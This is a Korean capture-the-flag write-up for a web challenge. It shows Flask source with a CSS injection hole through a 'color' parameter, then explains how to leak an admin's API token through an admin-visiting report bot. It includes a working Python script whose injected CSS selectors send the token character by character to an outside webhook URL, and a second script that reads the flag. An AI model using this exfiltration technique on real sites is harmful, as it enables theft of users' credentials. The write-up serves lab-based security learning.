## CSS Injection
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
import hashlib, os, binascii, random, string
from flask import Flask, request, render_template, redirect, url_for, session, g, flash
from functools import wraps
import sqlite3
from selenium import webdriver
from promise import Promise

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = os.environ.get('DATABASE', 'database.db')

try:
    FLAG = open('./flag.txt', 'r').read().strip()
except:
    FLAG = '[**FLAG**]'

ADMIN_USERNAME = 'administrator'
ADMIN_PASSWORD = binascii.hexlify(os.urandom(32))

def execute(query, data=()):
    con = sqlite3.connect(DATABASE)
    cur = con.cursor()
    cur.execute(query, data)
    con.commit()
    data = cur.fetchall()
    con.close()
    return data


def token_generate():
    while True:
        token = ''.join(random.choice(string.ascii_lowercase) for _ in range(16))
        token_exists = execute('SELECT * FROM users WHERE token = :token;', {'token': token})
        if not token_exists:
            return token


def login_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        if session and session['uid']:
            return view(**kwargs)
        flash('login first !')
        return redirect(url_for('login'))
    return wrapped_view


def apikey_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.headers.get('API-KEY', None)
        token = execute('SELECT * FROM users WHERE token = :token;', {'token': apikey})
        if token:
            request.uid = token[0][0]
            return view(**kwargs)
        return {'code': 401, 'message': 'Access Denined !'}
    return wrapped_view


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.context_processor
def background_color():
    color = request.args.get('color', 'white')
    return dict(color=color)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        username = request.form.get("username")
        password = request.form.get("password")
        user = execute('SELECT * FROM users WHERE username = :username and password = :password;', 
            {
                'username': username,
                'password': hashlib.sha256(password.encode()).hexdigest()
            })

        if user:
            session['uid'] = user[0][0]
            session['username'] = user[0][1]
            return redirect(url_for('index'))

        flash('Wrong username or password !')
        return redirect(url_for('login'))


@app.route('/logout')
@login_required
def logout():
    session.clear()
    flash('Logout !')
    return redirect(url_for('index'))


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        username = request.form.get("username")
        password = request.form.get("password")

        user = execute('SELECT * FROM users WHERE username = :username;', {'username': username})
        if user:
            flash('Username already exists !')
            return redirect(url_for('register'))

        token = token_generate()
        sql = "INSERT INTO users(username, password, token) VALUES (:username, :password, :token);"
        execute(sql, {'username': username, 'password': hashlib.sha256(password.encode()).hexdigest(), 'token': token})
        flash('Register Success.')
        return redirect(url_for('login'))


@app.route('/mypage')
@login_required
def mypage():
    user = execute('SELECT * FROM users WHERE uid = :uid;', {'uid': session['uid']})
    return render_template('mypage.html', user=user[0])


@app.route('/memo', methods=['GET', 'POST'])
@login_required
def memopage():
    if request.method == 'GET':
        memos = execute('SELECT * FROM memo WHERE uid = :uid;', {'uid': session['uid']}) 
        return render_template('memo.html', memos=memos)
    else:
        memo = request.form.get("memo")
        sql = "INSERT INTO memo(uid, text) VALUES(:uid, :text);"
        execute(sql, {'uid': session['uid'], 'text': memo})
    return redirect(url_for('memopage'))


# report
@app.route('/report', methods=['GET', 'POST'])
def report():
    if request.method == 'POST':
        path = request.form.get('path')
        if not path:
            flash('fail.')
            return redirect(url_for('report'))

        if path and path[0] == '/':
            path = path[1:]

        url = f'http://localhost:80/{path}'
        if check_url(url):
            flash('success.')
        else:
            flash('fail.')
        return redirect(url_for('report'))

    elif request.method == 'GET':
        return render_template('report.html')


def check_url(url):
    try:
        options = webdriver.ChromeOptions()
        for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
            options.add_argument(_)
        driver = webdriver.Chrome('./chromedriver', options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        
        driver_promise = Promise(driver.get('http://localhost:80/login'))
        driver_promise.then(driver.find_element_by_name("username").send_keys(str(ADMIN_USERNAME)))
        driver_promise.then(driver.find_element_by_name("password").send_keys(ADMIN_PASSWORD.decode()))

        driver_promise = Promise(driver.find_element_by_id("submit").click())
        driver_promise.then(driver.get(url))
    except Exception as e:
        driver.quit()
        return False
    finally:
        driver.quit()
    return True


# API
@app.route('/api/me')
@apikey_required
def APIme():
    user = execute('SELECT * FROM users WHERE uid = :uid;', {'uid': request.uid})
    if user:
        return {'code': 200, 'uid': user[0][0], 'username': user[0][1]}
    return {'code': 500, 'message': 'Error !'}

@app.route('/api/memo')
@apikey_required
def APImemo():
    memos = execute('SELECT * FROM memo WHERE uid = :uid;', {'uid': request.uid})
    if memos:
        memo = []
        for tmp in memos:
            memo.append({'idx': tmp[0], 'memo': tmp[2]})
        return {'code': 200, 'memo': memo}

    return {'code': 500, 'message': 'Error !'}


# For Challenge
@app.before_first_request
def init():
    execute('DROP TABLE IF EXISTS users;')
    execute('''
        CREATE TABLE users (
            uid INTEGER PRIMARY KEY,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            token TEXT NOT NULL UNIQUE
        );
    ''')

    execute('DROP TABLE IF EXISTS memo;')
    execute('''
        CREATE TABLE memo (
            idx INTEGER PRIMARY KEY,
            uid INTEGER NOT NULL,
            text TEXT NOT NULL
        );
    ''')

    # Add admin
    execute(
        'INSERT INTO users (username, password, token)'
        'VALUES (:username, :password, :token);',
        {
            'username': ADMIN_USERNAME,
            'password': hashlib.sha256(ADMIN_PASSWORD).hexdigest(),
            'token': token_generate()
        }
    )

    adminUid = execute('SELECT * FROM users WHERE username = :username;', {'username': ADMIN_USERNAME})

    # Add FLAG
    execute(
        'INSERT INTO memo (uid, text)'
        'VALUES (:uid, :text);',
        {
            'uid': adminUid[0][0],
            'text': 'FLAG is ' + FLAG
        }
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

코드를 보면 flag 값이 memo 테이블에 들어 있고, memo 테이블은 ```/api/memo```에서 불어온다.

```/api/memo```에 접속하려면 apikey가 필요하므로 apikey를 알아내어 헤더에 추가해준 뒤 접속해야 한다.

<br>

```python
@app.context_processor
def background_color():
    color = request.args.get('color', 'white')
    return dict(color=color)
```

<br>

context_processor
: <a href="https://flask.palletsprojects.com/en/2.1.x/templating/#context-processors" target="_blank">flask.palletsprojects.com/en/2.1.x/templating/#context-processors</a>

<br>

context_processor를 통해 color 매개변수를 입력할 수 있다. ```?color=red```를 입력해주면 배경 색이 빨강색으로 변한다.

그 다음 테스트 계정을 만든 뒤 mypage로 가보면 API Token이 있다.     
코드를 보면 ```<input type="text" class="form-control" id="InputApitoken" readonly value="hdwiuupxebiixiut">```로 되어 있다.

<br>

multiple css attribute selector
: <a href="https://stackoverflow.com/questions/12340737/specify-multiple-attribute-selectors-in-css" target="_blank">stackoverflow.com/questions/12340737/specify-multiple-attribute-selectors-in-css</a>

<br>

특성 선택자를 여러 개 할 수 있다. 

input 태그에 id, value, type 등 여러 속성들이 있는데 여러 개를 선택할 땐, ```input[id=InputApitoken][value^=h]```로 여러 속성을 선택할 수 있다.

<br>

report 페이지로 가면 localhost가 admin 계정으로 로그인 한 뒤 url에 접속한다. 

우리는 path에 ```mypage?color=red;} input[id=InputUsername][value^=a] {background: url(request bin url);```를 입력해주면 요청이 온 걸 알 수 있다.

코드를 보면 admin의 username은 administrator이므로 선택된다.

이 점을 이용하여 ```mypage?color=red;} input[id=InputApitoken][value^={token}] {background: url();```를 보내면서 admin의 token 값을 한자리 씩 알아낼 수 있다. 중간에 세션이 끊기면 처음부터 다시 구해야한다;

토큰이 a-z로 구성되어 있으므로 코드를 통해 입력해줘서 한 자리씩 알아내면 된다.

<br>

```python
import requests, string

url='http://host1.dreamhack.games:{port}/report'
headers={'Content-Type':'application/x-www-form-urlencoded'}

text=string.ascii_lowercase
token='' 

for t in text:
    payload={'path':'mypage?color=red;} input[id=InputApitoken][value^='+token+t+'] {background: url(	https://webhook.site/f0cfb185-f0da-4cc1-8d3b-1b0def720854?token='+token+t+');'}
    res=requests.post(url, headers=headers, data=payload)
    print(t)
```

<br>

apikey를 알아냈으면 API-KEY를 헤더에 추가해준 뒤 ```/api/memo```로 접속하면 된다.

<br>

```python
import requests

url='http://host1.dreamhack.games:{port}/api/memo'
headers={'Content-Type':'application/x-www-form-urlencoded', 'API-KEY':'[redacted]'}

res=requests.get(url, headers=headers)
print(res.text) # {"code":200,"memo":[{"idx":1,"memo":"FLAG is [redacted]"}]}
```

<br><br>
<hr style="border: 2px solid;">
<br><br>
